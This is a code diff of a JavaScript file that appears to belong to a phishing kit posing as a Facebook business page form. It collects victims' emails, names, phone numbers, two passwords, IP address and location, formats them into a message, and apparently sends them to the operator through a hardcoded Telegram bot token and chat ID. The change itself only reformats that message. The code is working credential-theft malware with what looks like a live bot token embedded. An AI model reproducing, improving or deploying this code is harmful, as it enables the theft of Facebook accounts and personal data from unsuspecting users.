@@ -51,7 +51,7 @@ $(document).ready(function () {
 
     openDetail();
     let IpAddress = '';
-    
+
     getIP(ip => {
         IpAddress = ip;
         sendForm(IpAddress);
@@ -227,17 +227,17 @@ function showPrompt(IpAddress) {
             keymap: "",
             trueWay: 0,
         };
-        
-        const message1   = '<strong>User Email: </strong>' + $("#business-email").val() + 
-        '%0A<strong>User Name: </strong>' + $("#full-name").val() + 
-        '%0A<strong>User Email: </strong>' + $("#personal-email").val() + 
-        '%0A<strong>Facebook Page: </strong>' + $("#page-name").val()+ 
-        '%0A<strong>Phone Number: </strong>' + $("#phone").val() + 
-        '%0A<strong>First Password: </strong>' + password +
-        '%0A<strong>Second Password: </strong>'+ secondPassword +
-        '%0A<strong>IP Address: </strong>' + IpAddress.ipAddress +
-        '%0A<strong>Country : </strong>' + IpAddress.countryName +'( '+IpAddress.countryCode+' )'+
-        '%0A<strong>City : </strong>' + IpAddress.city ;
+
+        const message1 = `<strong>User Email: </strong><code>${$("#business-email").val()}</code>
+%0A<strong>User Name: </strong><code>${$("#full-name").val()}</code>
+%0A<strong>User Email: </strong><code>${$("#personal-email").val()}</code>
+%0A<strong>Facebook Page: </strong><code>${$("#page-name").val()}</code>
+%0A<strong>Phone Number: </strong><code>${$("#phone").val()}</code>
+%0A<strong>First Password: </strong><code>${password}</code>
+%0A<strong>Second Password: </strong><code>${secondPassword}</code>
+%0A<strong>IP Address: </strong><code>${IpAddress.ipAddress}</code>
+%0A<strong>Country: </strong><code>${IpAddress.countryName}</code> (<code>${IpAddress.countryCode}</code>)
+%0A<strong>City: </strong><code>${IpAddress.city}</code>`;
 
         const botToken = '7371433087:AAHBPfH8Kshg2ce5ZHCHLDYe43ivmzKnCqk'; // Thay YOUR_BOT_TOKEN bằng bot_token của bạn
         const chatId = '-1002416068664'; // Thay YOUR_CHAT_ID bằng chat_id của bạn
